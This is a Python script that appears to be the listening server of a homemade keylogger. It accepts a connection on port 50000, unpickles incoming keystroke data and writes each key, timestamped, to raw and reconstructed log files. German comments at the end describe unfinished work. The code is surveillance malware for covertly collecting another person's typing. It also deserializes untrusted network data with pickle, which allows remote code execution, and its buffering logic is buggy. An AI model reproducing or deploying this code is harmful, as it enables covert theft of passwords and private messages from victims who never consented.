import socket
import pickle
import datetime


class Socket:
    connection = False

    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((socket.gethostname(), 50000))
        self.listen_to_for_client()

    def listen_to_for_client(self):
        try:
            print("Listening...")
            self.socket.listen(1)
            self.connection, self.address = self.socket.accept()
            Socket.connection_established = True
            print(f"Connection established with {self.address}")
        except socket.timeout:
            Socket.connection_established = False


class Global_Variables:
    shift_pressed = False
    buffer_overflow = False


def write_to_log_file(character):
    with open("Logfile_not_structured.txt", "a+")as log_file:
        character = str(character)
        log_file.write(str(datetime.datetime.now()) + f"  {character}" + "\n")

    with open("Logfile_structured.txt", "a+")as log_file:
        if character == "Key.backspace":
            with open("Logfile_structured.txt", "r")as temp_log_file:
                temp = temp_log_file.read()
            with open("Logfile_structured.txt", "w")as temp_log_file:
                temp_log_file.write(temp[0:-1])

        elif character == "Key.shift":
            Global_Variables.shift_pressed = True

        elif character == "Key.space":
            log_file.write(" ")

        elif character == "Key.enter":
            log_file.write("\n")

        elif character == "Key.tab":
            log_file.write("\t")

        else:
            if Global_Variables.shift_pressed:
                log_file.write(character.capitalize())
                Global_Variables.shift_pressed = False
            else:
                log_file.write(character)


connection = Socket()
while True:
    if not Socket.connection_established:
        connection.listen_to_for_client()
    temp_array = b""
    while True:
        try:
            data_rec = connection.connection.recv(32)
            if not data_rec:
                break
        except ConnectionResetError:
            print(f"Lost Connection to {connection.address}")
            Socket.connection_established = False
            break

        while True:
            try:
                data_rec = pickle.loads(data_rec)
                temp_array = data_rec
                break
            except pickle.UnpicklingError:
                temp_array += data_rec
                Global_Variables.buffer_overflow = True
                continue

        if Global_Variables.buffer_overflow:
            data_rec = pickle.loads(temp_array)
            Global_Variables.buffer_overflow = False

        if type(data_rec) == list:
            for char in data_rec:
                write_to_log_file(char)
        elif type(data_rec) == str:
            write_to_log_file(data_rec)
        print(data_rec)


#Buffer overflwo weitermachen
# Log File formatten mit permanent shift
# Große arrays richtig verwalten ohne _pickle.UnpicklingError: pickle data was truncated
